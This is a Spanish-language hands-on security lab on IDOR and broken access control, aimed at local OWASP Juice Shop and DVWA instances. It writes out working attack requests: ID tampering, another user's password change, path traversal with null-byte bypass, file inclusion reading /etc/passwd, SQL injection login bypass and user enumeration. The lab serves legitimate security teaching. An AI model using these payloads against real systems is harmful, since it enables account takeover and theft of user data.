# Lab 04 — IDOR & Broken Access Control

## Objetivo

Identificar y explotar Insecure Direct Object References (IDOR) y fallos de control de acceso: acceder a recursos de otros usuarios, elevar privilegios y bypassear restricciones de autorización.

**App objetivo:** OWASP Juice Shop (`http://localhost:3000`)

---

## Conceptos

**IDOR** ocurre cuando una aplicación expone referencias directas a objetos internos (IDs, nombres de archivo) sin verificar si el usuario tiene permiso para acceder a ese objeto.

```
GET /api/users/1/orders   ← ¿Y si cambias el 1 por 2?
GET /download?file=report_user1.pdf  ← ¿Y si cambias el filename?
GET /api/basket/1  ← ¿Puedes ver la cesta de otro usuario?
```

**OWASP A01:2021 — Broken Access Control** es la vulnerabilidad #1 del Top 10.

---

## Parte 1 — IDOR en Juice Shop

### Setup: Crear dos cuentas

```
Cuenta A (atacante):  attacker@test.com / Password1!
Cuenta B (víctima):   victim@test.com   / Password1!
```

### 1.1 — Acceder a la cesta de otro usuario

```bash
# Con Burp activo, añadir algo a tu cesta
# Interceptar la petición:
GET /api/Baskets/1 HTTP/1.1
Authorization: Bearer <tu_token>

# Cambiar el ID:
GET /api/Baskets/2 HTTP/1.1

# Si devuelve la cesta del usuario 2 → IDOR confirmado
```

### 1.2 — Ver pedidos de otro usuario

```bash
# Navegar a tus pedidos
# URL: http://localhost:3000/profile
# Interceptar con Burp:
GET /rest/track-order/YOUR_ORDER_ID

# Probar con IDs de otros pedidos
```

### 1.3 — Cambiar la contraseña de otro usuario (IDOR crítico)

```bash
# Interceptar el cambio de contraseña propio
PUT /api/Users/1 HTTP/1.1
{"password": "NewPass123"}

# Cambiar el ID por el del admin (normalmente id=1)
PUT /api/Users/1 HTTP/1.1
{"password": "hackeado123"}
```

---

## Parte 2 — Escalada horizontal y vertical

### Horizontal: acceder a recursos de otro usuario del mismo nivel

```bash
# Juice Shop — ver perfil de otro usuario
GET /rest/user/whoami  ← tu propio perfil
# Interceptar y cambiar el token por el de otro usuario
```

### Vertical: acceder a funcionalidades de mayor privilegio

```bash
# Juice Shop — acceder al panel de administración
http://localhost:3000/#/administration
# (solo accesible para admin, pero la ruta existe)

# API de admin sin autenticación suficiente
GET /api/Users/           ← listar todos los usuarios
GET /api/SecurityQuestions/
```

---

## Parte 3 — Path Traversal (variante de IDOR)

```bash
# Juice Shop — descargar archivos del servidor
GET /ftp/                   ← directorio FTP público
GET /ftp/legal.md           ← archivo público
GET /ftp/eastere.gg         ← acceso no autorizado (403)

# Bypass con encoded characters
GET /ftp/eastere.gg%2500.md   ← null byte encoding
GET /ftp/coupons_2013.md.bak  ← backup expuesto

# DVWA — File Inclusion (similar a path traversal)
http://localhost:8080/vulnerabilities/fi/?page=../../../../etc/passwd
http://localhost:8080/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php
```

---

## Parte 4 — Pruebas sistemáticas de access control

### Checklist OWASP

```bash
# 1. Identificar todos los endpoints que usan IDs
grep -oE '\/[a-zA-Z]+\/[0-9]+' burp_sitemap.txt

# 2. Para cada endpoint con ID, probar:
#    - ID actual del usuario: respuesta normal
#    - ID = 0: respuesta de error o distinta
#    - ID negativo: respuesta de error
#    - ID de otro usuario conocido: ¿devuelve datos?
#    - ID string ("admin"): respuesta de error

# 3. Probar con otro token (cuenta B)
# Repetir las mismas peticiones con el token de la cuenta B
# Si cuenta B puede ver datos de cuenta A → IDOR

# 4. Sin token
# Eliminar el header Authorization completamente
# ¿Sigue funcionando? → Falta de autenticación
```

### Automatizar con Burp Intruder

```
1. Enviar GET /api/Users/§1§ a Intruder
2. Attack type: Sniper
3. Payload: Numbers from 1 to 100
4. Filtrar respuestas: length > 100 (tiene datos)
```

---

## Parte 5 — Privilege Escalation en Juice Shop

### Obtener token de admin

```bash
# Inyección SQLi en el login de Juice Shop
Email:    ' OR TRUE--
Password: (cualquier cosa)

# O usar credenciales por defecto:
Email:    admin@juice-sh.op
# Contraseña: encontrarla en el código fuente o BD
```

### Acceder a la API de administración

```bash
# Con token de admin
curl -H "Authorization: Bearer ADMIN_TOKEN" \
     http://localhost:3000/api/Users/ | python3 -m json.tool

# Ver todos los usuarios, emails, contraseñas (hashed)
```

---

## Actividades

1. Acceder a la cesta de otro usuario en Juice Shop con IDOR
2. Ver el perfil completo de otro usuario via API
3. Listar todos los archivos del directorio `/ftp/` de Juice Shop
4. Usar Burp Intruder para enumerar IDs de usuarios (1-50)
5. Documentar cada hallazgo con: petición original → petición manipulada → impacto

---

## Mapeo MITRE ATT&CK

| Técnica | TTP |
|---------|-----|
| IDOR / BAC | T1078 — Valid Accounts (acceso no autorizado) |
| Path Traversal | T1083 — File and Directory Discovery |
| Privilege Escalation web | T1548 |

---

## Referencias

- [PortSwigger — Access Control](https://portswigger.net/web-security/access-control)
- [OWASP — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP Testing Guide — IDOR](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
